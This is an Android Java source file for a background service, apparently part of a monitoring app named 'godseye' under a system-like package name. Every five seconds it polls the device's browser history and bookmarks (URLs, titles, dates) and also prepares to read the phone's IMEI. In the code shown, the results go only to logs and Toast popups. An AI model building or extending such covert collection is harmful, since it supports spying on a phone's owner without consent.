package com.android.godseye;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.StrictMode;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;



import java.io.File;
import java.util.ArrayList;
import java.util.List;

@TargetApi(Build.VERSION_CODES.GINGERBREAD)
public class BrowsingService extends Service {
    Handler h;
    String m = "";
    String imei;
    String url12 = "";
    SharedPreferences sh;
    @Override
    public void onStart(Intent intent, int startId) {
        // TODO Auto-generated method stubbrowse
        h = new Handler();
        Thread th = new Thread(b);
        th.start();
        super.onStart(intent, startId);


        TelephonyManager tel = (TelephonyManager) getApplicationContext().getSystemService(TELEPHONY_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    Activity#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for Activity#requestPermissions for more details.
                return;
            }
        }
//        imei = tel.getDeviceId().toString();






    }

    Runnable b = new Runnable() {
        @Override
        public void run() {

                    h.postDelayed(b, 5000);

                    getBrowserHistory();



    }};


    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    public void getBrowserHistory() {
        Log.d("pppppppppppppppppppp","hoi");
        Cursor mCur = null;
        try {
            Uri BOOKMARKS_URI = Uri.parse("content://browser/bookmarks");
            final String[] HISTORY_PROJECTION = new String[]{
                    "_id", // 0
                    "url", // 1
                    "visits", // 2
                    "date", // 3
                    "bookmark", // 4
                    "title", // 5
                    "favicon", // 6
                    "thumbnail", // 7
                    "touch_icon", // 8
                    "user_entered", // 9
            };
            Log.d("pppppppppppppppppppp","one");
            final int HISTORY_PROJECTION_TITLE_INDEX = 5;
            final int HISTORY_PROJECTION_URL_INDEX = 1;
            String sortOrder = "3 ASC";
            mCur = getContentResolver().query(BOOKMARKS_URI, HISTORY_PROJECTION, null, null, sortOrder);
            Log.d("pppppppppppppppppppp","two");
            Log.d("mcur",mCur.getCount()+"");
            Log.d("size==========", mCur.getCount() + "");
            mCur.moveToFirst();
            Toast.makeText(getApplicationContext(),mCur.getCount() + "", Toast.LENGTH_LONG).show();


            if (mCur.moveToFirst() && mCur.getCount() > 0) {
                while (mCur.isAfterLast() == false) {
                    String title = mCur.getString(5);
                    String url = mCur.getString(1);
                    long date = mCur.getLong(3);
                    Log.d("b==========", date + "--" + title);
                    Toast.makeText(getApplicationContext(), "url"+url, Toast.LENGTH_LONG).show();
//                    Toast.makeText(getApplicationContext(), imei, Toast.LENGTH_LONG).show();
                    Toast.makeText(getApplicationContext(), "tit"+title, Toast.LENGTH_LONG).show();









                    mCur.moveToNext();
                }
            } else {
                mCur.close();
            }

        } catch (Exception e) {
            Log.d("1=====", e.toString());

        } finally {
            Log.d("finally--","ffffffff");
          //  mCur.close();
        }



    }

}











